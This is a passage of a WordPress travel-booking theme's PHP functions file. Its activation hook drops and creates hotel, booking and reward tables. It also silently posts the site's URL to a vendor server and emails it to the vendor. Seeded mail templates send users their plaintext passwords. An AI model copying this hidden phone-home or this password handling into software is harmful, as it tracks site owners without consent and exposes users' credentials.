					'sk'=>array(0=>'sk_SK',1=>'Slovak'),
					'th'=>array(0=>'th_TH',1=>'Thai'),
					'tr'=>array(0=>'tr_TR',1=>'Turkish'),
					'uk'=>array(0=>'uk_UA',1=>'Ukranian'),
					'vi'=>array(0=>'vi_VN',1=>'Vietnamese'),
					'zh-hant'=>array(0=>'zh_TW',1=>'Traditional Chinese'),
					'zh-hans'=>array(0=>'zh_CN',1=>'Simplified Chinese')
					);	
					
    if($name=='name'){					
     $lang_name =$ean_langArr[$lang][1];	
     return $lang_name; 
    }else{
	 $ean_lang =$ean_langArr[$lang][0];	
     return $ean_lang; 	
	}	
}	

//---URL Rewritting------------------------------------------------------------------------------------ 
//Activate Deactivate

wp_register_theme_activation_hook('twentyten', 'wpse_25885_theme_activate');
wp_register_theme_deactivation_hook('twentyten', 'wpse_25885_theme_deactivate');

function wp_register_theme_activation_hook($code, $function) {
	$code = "thewebconz";
    $optionKey="theme_is_activated_" . $code;
    if(!get_option($optionKey)) {
        call_user_func($function);
        update_option($optionKey , 1);
    }
}

function wp_register_theme_deactivation_hook($code, $function)
{
    // store function in code specific global
    $GLOBALS["wp_register_theme_deactivation_hook_function" . $code]=$function;
	$code = "thewebconz";
    // create a runtime function which will delete the option set while activation of this theme and will call deactivation function provided in $function
    $fn=create_function('$theme', ' call_user_func($GLOBALS["wp_register_theme_deactivation_hook_function' . $code . '"]); delete_option("theme_is_activated_' . $code. '");');

    // add above created function to switch_theme action hook. This hook gets called when admin changes the theme.
    // Due to wordpress core implementation this hook can only be received by currently active theme (which is going to be deactivated as admin has chosen another one.
    // Your theme can perceive this hook as a deactivation hook.)
    add_action("switch_theme", $fn);
}

function wpse_25885_theme_activate()
{
    global $wpdb;
	$Drop_Search_Table = "drop table search_results";
	$wpdb->query($Drop_Search_Table);
	
 $Create_Search_Table = "CREATE TABLE IF NOT EXISTS `search_results` (
  `EANHotelID` varchar(1000) NOT NULL,
  `Name` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `Address1` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `Address2` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `City` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `Country` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `StarRating` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `LowRate` decimal(20,2) NOT NULL,
  `highRate` decimal(20,2) NOT NULL,
  `latitude` varchar(250) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `longitude` varchar(250) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `tripAdvisorRating` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `promoDescription` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `currentAllotment` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `nonRefundable` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `fn` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `thumbNailUrl` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `tripAdvisorReviewCount` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `confidenceRating` varchar(250) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL COMMENT 'Ring',
  `proximityDistance` varchar(250) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `proximityUnit` varchar(500) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `propertyCategory` int(11) NOT NULL,
  `valueAdds` text CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `amenityMask` varchar(500) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `date_time` date NOT NULL,
  `destination_id` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `checkin` date NOT NULL,
  `checkout` date NOT NULL,
  `currency` varchar(250) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `langauge` varchar(250) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `shortDescription` text CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `search_session` varchar(500) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `sort_order` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;";

$wpdb->query($Create_Search_Table);



$Create_landingPage ="CREATE TABLE IF NOT EXISTS `landing_pages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `destination_id` varchar(1000) NOT NULL,
  `destination_name` varchar(1000) NOT NULL,
  `page_id` int(11) NOT NULL,
  `shortDescription` text NOT NULL,
  `published` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1;";
$wpdb->query($Create_landingPage);



$Drop_Search_Amenity = "drop table search_hotels_amenity";
$wpdb->query($Drop_Search_Amenity);
$Create_Search_Amenity ="CREATE TABLE IF NOT EXISTS `search_hotels_amenity` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `destination_id` varchar(500) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `hotels_id` varchar(500) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `currency` varchar(500) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `language` varchar(500) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `ValueAdds_id` int(11) NOT NULL,
  `ValueAdds_desc` text CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `search_session` varchar(1000) NOT NULL,
  `date_time` date NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1;";
$wpdb->query($Create_Search_Amenity);

  
$Create_Booking_Table ="CREATE TABLE IF NOT EXISTS `twc_booking` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `itineraryId` varchar(500) NOT NULL,
  `confirmationNumbers` varchar(500) NOT NULL,
  `booking_status` varchar(500) NOT NULL,
  `hotel_img` varchar(500) NOT NULL,
  `hotel_id` varchar(500) NOT NULL,
  `hotelName` varchar(2000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `hotelRating` varchar(500) NOT NULL,
  `hotelAddress` varchar(2000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `hotelCity` varchar(2000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `hotelCountryCode` varchar(2000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `user_name` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `user_email` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `user_contactno` varchar(500)  CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `login_id` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `fb_email` varchar(1000) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `left_html` text CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `request_xml` text CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `response_xml` text CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `checkInInstructions` text CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `check_in` date NOT NULL,
  `check_out` date NOT NULL,
  `chargable_rate` varchar(1000) NOT NULL,
  `currency_code` varchar(1000) NOT NULL,
  `published` varchar(500) NOT NULL DEFAULT 'Yes',
  `date_time` datetime NOT NULL,
  `status_deleted` int(11) NOT NULL,
  `sort_order` int(11) NOT NULL,
  
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;"; 
  $wpdb->query($Create_Booking_Table);

$checkfieldSql =$wpdb->get_results("select check_in from twc_booking");
if (!$checkfieldSql){
 $wpdb->query("ALTER TABLE `twc_booking` ADD `check_in` DATE NOT NULL AFTER `checkInInstructions` ,
					ADD `check_out` DATE NOT NULL AFTER `check_in` ,
					ADD `chargable_rate` VARCHAR( 1000 ) NOT NULL AFTER `check_out` ,
					ADD `currency_code` VARCHAR( 1000 ) NOT NULL AFTER `chargable_rate` 
					");
}  
	
$Create_Search_Table = "CREATE TABLE IF NOT EXISTS `user_linkfb_frnds` (
	`cid` varchar(2000) NOT NULL,
	`frnd_name` varchar(2000) NOT NULL,
	`frnd_id` varchar(2000) NOT NULL
	) ENGINE=MyISAM DEFAULT CHARSET=latin1;";
	
	$wpdb->query($Create_Search_Table);
	
	
	$Create_Search_Table = "CREATE TABLE IF NOT EXISTS `user_linkfb` (
	`userid` varchar(3000) NOT NULL,
	`username` varchar(3000) NOT NULL,
	`link` varchar(3000) NOT NULL,
	`id` varchar(3000) NOT NULL,
	`email` varchar(3000) NOT NULL
	) ENGINE=MyISAM DEFAULT CHARSET=latin1;";
	
	$wpdb->query($Create_Search_Table);
	
	
$Create_mail_messages="CREATE TABLE IF NOT EXISTS `twc_mail_messages` (
  `id` text NOT NULL,
  `title` text NOT NULL,
  `subject` text NOT NULL,
  `messages_content` text NOT NULL,
  `published` text NOT NULL,
  `sort_order` text NOT NULL,
  `date_time` datetime NOT NULL,
  `status_deleted` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;";
$wpdb->query($Create_mail_messages);

$chResults = $wpdb->get_results("select * from twc_mail_messages where id='TWCV1418381928TWC548aca684ed4c'");
if(count($chResults) ==0){
	$wpdb->query("INSERT INTO `twc_mail_messages` (`id`, `title`, `subject`, `messages_content`, `published`, `sort_order`, `date_time`, `status_deleted`) VALUES
('TWCV1418381928TWC548aca684ed4c', 'redeem mail for admin', 'Redeem Request', '<p>Dear</p>\r\n<p>User send a new redeem request for approval</p>\r\n<p><b>User Details</b></p>\r\n<p>Name: {USERNAME}</p>\r\n<p>Email: {EMAIL}</p>\r\n<p>Phone No: {PHONENO}</p>\r\n<p>Address: {ADDRESS}</p>\r\n<p>User Reward: {USER_REWARD}</p>\r\n<p>Redeem: {REDEEM}</p>', 'Yes', '1', '2014-12-12 03:30:26', 0),
('TWCB1418466092TWC548c132c50262', 'Registration  user mail', 'Thank you for registration with Us', '<p>Dear {UserName}</p>\r\n<p>Your registration has been completed</p>\r\n<p>User: {UserEmail}</p>\r\n<p>Password: {UserPassword}</p>', 'Yes', '2', '2014-12-13 02:23:14', 0),
('TWCI1418469416TWC548c2028ed9f4', 'Forgot Password', 'Find your password', '<p>Dear {UserName}</p>\r\n<p>Your password is <b>{UserPassword}</b></p>', 'Yes', '3', '2014-12-13 03:16:56', 0),
('TWCZ1424328181TWC54e585f50d966', 'Contact user mail', 'Thank for contacting with us', '<p>Dear {USERNAME}</p>\r\n\r\n<p>Thank for contacting with us. My Team will be contact with you as soon as possible.</p>', 'Yes', '4', '2015-02-19 00:32:37', 0),
('TWCX1424328665TWC54e587d98f02c', 'Contact admin mail', 'A new user are contacting with you', '<p>A new user are contacting with you.</p>\r\n<p>User Details </p>\r\n<p>Name: {USERNAME}</p>\r\n<p>Email: {EMAIL}</p>\r\n<p>Contact No.: {PHONE}</p>\r\n<p>Message: {MESSAGE}</p>', 'Yes', '5', '2015-02-18 23:51:05', 0),
('TWCO1424503134TWC54e8315e3d419', 'Subscriber Mail', 'Your request has been submitted', '<p>Dear</p>\r\n<p>Thank You for register with us.</p>\r\n<p>Your login details</p>\r\n<p><b>User:</b> {USEREMAIL}</p>\r\n<p><b>Password:</b> {PASSWORD}</p>', 'Yes', '6', '2015-02-21 00:18:54', 0),
('TWCU1435662501TWC559278a56a7fd', 'Success booking mail to user', 'Thank you for booking with us', '<p>Dear {USERNAME}</p>\r\n<p>You have successfully make booking with us.please find the booking details.</p>\r\n<p><b>Booking Detail</b><p>\r\n<p>{BOOKING-DETAILS}</p>', 'Yes', '7', '2015-02-21 00:18:54', 0),
('TWCI1435662672TWC559279500ecd0', 'Failure booking mail to user', 'You booking failed', '<p>Dear {USERNAME}</p>\r\n<p>You booking has been failed Please try again letter</p>\r\n', 'Yes', '8', '2015-02-21 00:18:54', 0);");
}	
// Add extra message///
$mResults =$wpdb->get_results("select * from twc_mail_messages where id='TWCU1435662501TWC559278a56a7fd'");
if(count($mResults)==0){
$wpdb->query("INSERT INTO `twc_mail_messages` (`id`, `title`, `subject`, `messages_content`, `published`, `sort_order`, `date_time`, `status_deleted`) VALUES ('TWCU1435662501TWC559278a56a7fd', 'Success booking mail to user', 'Thank you for booking with us', '<p>Dear {USERNAME}</p>\r\n<p>You have successfully make booking with us.please find the booking details.</p>\r\n<p><b>Booking Detail</b><p>\r\n<p>{BOOKING-DETAILS}</p>', 'Yes', '7', '2015-02-21 00:18:54', 0),
('TWCI1435662672TWC559279500ecd0', 'Failure booking mail to user', 'You booking failed', '<p>Dear {USERNAME}</p>\r\n<p>You booking has been failed Please try again letter</p>\r\n', 'Yes', '8', '2015-02-21 00:18:54', 0);");
}




	
$Create_redemption="CREATE TABLE IF NOT EXISTS `twc_redemption` (
  `id` varchar(500) NOT NULL,
  `reward_points` int(11) NOT NULL,
  `price` decimal(8,2) NOT NULL,
  `published` varchar(500) NOT NULL,
  `date_time` datetime NOT NULL,
  `status_deleted` int(11) NOT NULL,
  `sort_order` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;";

$wpdb->query($Create_redemption);

$chResults = $wpdb->get_results("select * from twc_redemption where id='TWCO1418121236TWC5486d0149190f'");
if(count($chResults) ==0){
$wpdb->query("INSERT INTO `twc_redemption` (`id`, `reward_points`, `price`, `published`, `date_time`, `status_deleted`, `sort_order`) VALUES
('TWCO1418121236TWC5486d0149190f', 500, '20.00', 'Yes', '2014-12-09 02:33:56', 0, 1),
('TWCY1418121262TWC5486d02ef33b1', 1000, '40.00', 'Yes', '2014-12-09 02:34:22', 0, 2),
('TWCM1418121291TWC5486d04b9751d', 2500, '100.00', 'Yes', '2014-12-09 02:34:51', 0, 3),
('TWCR1418121318TWC5486d06604896', 5000, '200.00', 'Yes', '2014-12-09 02:35:18', 0, 4),
('TWCO1418121345TWC5486d081ad190', 10000, '400.00', 'Yes', '2014-12-09 02:35:45', 0, 5);");
}


$Create_rewards ="CREATE TABLE IF NOT EXISTS `twc_rewards` (
  `id` varchar(500) NOT NULL,
  `reward_points` varchar(500) NOT NULL,
  `price_range` varchar(1000) NOT NULL,
  `min_rate` decimal(8,2) NOT NULL,
  `max_rate` decimal(8,2) NOT NULL,
  `published` varchar(500) NOT NULL,
  `date_time` datetime NOT NULL,
  `status_deleted` int(11) NOT NULL,
  `sort_order` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;";
$wpdb->query($Create_rewards);

$chResults = $wpdb->get_results("select * from twc_rewards where id='TWCE1418120540TWC5486cd5c2faf4'");
if(count($chResults) ==0){
$wpdb->query("INSERT INTO `twc_rewards` (`id`, `reward_points`, `price_range`, `min_rate`, `max_rate`, `published`, `date_time`, `status_deleted`, `sort_order`) VALUES
('TWCE1418120540TWC5486cd5c2faf4', '20', '0.00-50.00', '0.00', '50.00', 'Yes', '2014-12-09 02:23:05', 0, 1),
('TWCA1418120558TWC5486cd6e2f2ec', '50', '50.01-150.00', '50.01', '150.00', 'Yes', '2014-12-09 02:22:38', 0, 2),
('TWCO1418120610TWC5486cda2204f5', '100', '150.01-250.00', '150.01', '250.00', 'Yes', '2014-12-09 02:23:30', 0, 3),
('TWCM1418120634TWC5486cdbab78c6', '150', '250.01-400.00', '250.01', '400.00', 'Yes', '2014-12-09 02:23:54', 0, 4),
('TWCJ1418120648TWC5486cdc8852e4', '200', '400.01-10000000', '400.01', '999999.99', 'Yes', '2014-12-09 02:24:08', 0, 5);");
}

$Create_used_rewards ="CREATE TABLE IF NOT EXISTS `twc_used_rewards` (
  `id` varchar(200) NOT NULL,
  `title` varchar(500) NOT NULL,
  `email` varchar(500) NOT NULL,
  `address` varchar(500) NOT NULL,
  `contact_no` varchar(500) NOT NULL,
  `user_rewards` varchar(500) NOT NULL,
  `user_id` varchar(500) NOT NULL,
  `redeem_id` varchar(500) NOT NULL,
  `redeem_price` varchar(500) NOT NULL,
  `redeem_points` varchar(500) NOT NULL,
  `approved` varchar(500) NOT NULL,
  `published` varchar(500) NOT NULL,
  `sort_order` int(11) NOT NULL,
  `date_time` datetime NOT NULL,
  `status_deleted` varchar(200) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;";
$wpdb->query($Create_used_rewards);

$Create_user_rewards ="CREATE TABLE IF NOT EXISTS `twc_user_rewards` (
  `id` int(11) NOT NULL,
  `user_id` varchar(500) NOT NULL,
  `rewards` varchar(500) NOT NULL,
  `published` varchar(500) NOT NULL,
  `date_time` datetime NOT NULL,
  `status_delete` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;";
$wpdb->query($Create_user_rewards);

$Create_Meta="CREATE TABLE IF NOT EXISTS `twc_meta` (
  `id` text NOT NULL,
  `title` text NOT NULL,
  `page_id` varchar(1000) NOT NULL,
  `meta_title` text NOT NULL,
  `meta_key` text NOT NULL,
  `meta_description` text NOT NULL,
  `published` text NOT NULL,
  `sort_order` int(11) NOT NULL,
  `date_time` datetime NOT NULL,
  `status_deleted` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;";
$wpdb->query($Create_Meta);

$chmResults = $wpdb->get_results("select * from twc_meta where id='TWCE1421048989TWC54b37c9d97867'");
if(count($chmResults) ==0){
$wpdb->query("INSERT INTO `twc_meta` (`id`, `page_id`, `title`, `meta_title`, `meta_key`, `meta_description`, `published`, `date_time`, `status_deleted`, `sort_order`) VALUES
('TWCE1421048989TWC54b37c9d97867','-1', 'hotel information', '{HotelName} located in {Location}', '{HotelName} located in {Location}', '{HotelName} located in {Location}', 'Yes', '2014-12-09 02:23:05', 0, 1),
('TWCC1421049138TWC54b37d325674a','-2', 'Hotel Lists', 'Hotels in {Location}', 'Hotels in {Location}', 'Hotels in {Location}', 'Yes', '2014-12-09 02:22:38', 0, 2),
('TWCD1421050480TWC54b3827063516', '-3', 'online booking', 'online booking', 'online booking', 'online booking', 'Yes', '2014-12-09 02:23:30', 0, 3),
('TWCF1421050533TWC54b382a54891b','-4', 'Final booking', 'Final booking', 'Final booking', 'Final booking', 'Yes', '2014-12-09 02:23:54', 0, 4),
('TWCO1421050582TWC54b382d65cdad','-5', 'confirmation', 'confirmation', 'confirmation', 'confirmation', 'Yes', '2014-12-09 02:24:08', 0, 5);");
}
	
	$URL = "http://www.wordpress-travel-affiliate-themes.com/custom_ajax.php";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $URL);
	curl_setopt($ch, CURLOPT_POSTFIELDS,"action=new_theme_activated&url=".site_url());
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 300);
	$result = curl_exec($ch);
	curl_close($ch);
	
	$str = "<div style='color:#666; font-family:Arial, Helvetica, sans-serif; font-size:13px;'>".site_url()."</div>";
	$headers = "From: Theme Activated <support@thewebconz.com>\r\nReply-To:support@thewebconz.com\r\nContent-type: text/html; charset=us scii";
	@mail("support@thewebconz.com","Theme Activated", $str, $headers);
}

/*
function wpse_25885_theme_deactivate() 
{
   
	
}*/


function twc_bp_header_text($pagename){
	 global $mk_options;
	 if($pagename=='bp_activities'){
	    $return  = $mk_options['bp_activities'];
	 }
	 else if($pagename=='bp_profile'){
	    $return  = $mk_options['bp_profile'];
	 }
	 else if($pagename=='bp_notifications'){
	    $return  = $mk_options['bp_notifications'];
	 }
	 else if($pagename=='bp_messages'){
	    $return  = $mk_options['bp_messages'];
	 }
	 else if($pagename=='bp_friends'){
	    $return  = $mk_options['bp_friends'];
	 }
	 else if($pagename=='bp_settings'){
	    $return  = $mk_options['bp_settings'];
	 }
	 else{
		 $return  = $mk_options['bp_default'];
	}
	return  $return;
}

//-------------------------Color Coding

/*Start of Color Customization. Set initial Values*/

/*
add_action('init', 'myStartSession', 1);
function myStartSession() {
    if(!session_id()) {
		session_destroy ();
        session_start();
    }
}
*/

function hex2rgb( $colour ) {
        if ( $colour[0] == '#' ) {
                $colour = substr( $colour, 1 );
        }
        if ( strlen( $colour ) == 6 ) {
                list( $r, $g, $b ) = array( $colour[0] . $colour[1], $colour[2] . $colour[3], $colour[4] . $colour[5] );
        } elseif ( strlen( $colour ) == 3 ) {
                list( $r, $g, $b ) = array( $colour[0] . $colour[0], $colour[1] . $colour[1], $colour[2] . $colour[2] );
        } else {
                return false;
        }
        $r = hexdec( $r );
        $g = hexdec( $g );
        $b = hexdec( $b );
        return array( 'red' => $r, 'green' => $g, 'blue' => $b );
}

/*
	if(($_REQUEST["themecolors"]=="") && ($_SESSION['main_color']=="")){
		$_SESSION['main_color'] = "#59c45a";
		$_SESSION['main_color_hex2rgb'] = "89, 196, 90";
	}else{
	  $_SESSION['main_color'] = "#".$_REQUEST["themecolors"];
	   $main_color_hex2rgb = hex2rgb($_REQUEST["themecolors"]);
	  $_SESSION['main_color_hex2rgb'] = $main_color_hex2rgb['red'].", ".$main_color_hex2rgb['green'].", ".$main_color_hex2rgb['blue'];
	}
	*/
$_SESSION['text_color'] = "#fff";
$_SESSION['whitelabeling_hotels'] = "http://flight.adivaha.com/hotels";
$_SESSION['whitelabeling_flights'] = "http://flight.adivaha.com/flights";
/*End of Color Customization*/

//------- Custom shortcode ----------------
include (get_template_directory() . '/files/custom-shortcode.php');
?>